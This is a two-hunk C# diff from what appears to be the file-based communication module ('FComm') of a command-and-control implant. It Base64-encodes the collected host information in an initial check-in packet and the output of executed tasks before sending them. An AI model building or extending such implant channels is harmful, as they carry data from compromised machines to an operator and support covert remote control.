@@ -82,7 +82,7 @@ namespace FComm
                 f.Close();
                 f.Dispose();
                 //lets populate it with the info we need.
-                RHDataGram InitialContent = new RHDataGram() { PacketType = "INIT", Input = "initial", Output = HostInfo, Actioned = true };
+                RHDataGram InitialContent = new RHDataGram() { PacketType = "INIT", Input = "initial", Output = Convert.ToBase64String(Encoding.UTF8.GetBytes(HostInfo)), Actioned = true };
                 SendData(InitialContent);
             }
             catch (SecurityException e)
@@ -428,7 +428,7 @@ namespace FComm
                         }
 
                         output.Append(sOutput2.ToString());
-                        Task.Output = output.ToString();
+                        Task.Output = Convert.ToBase64String(Encoding.UTF8.GetBytes(output.ToString()));
                         Task.Actioned = true;
                         output.Clear();
                         output.Length = 0;
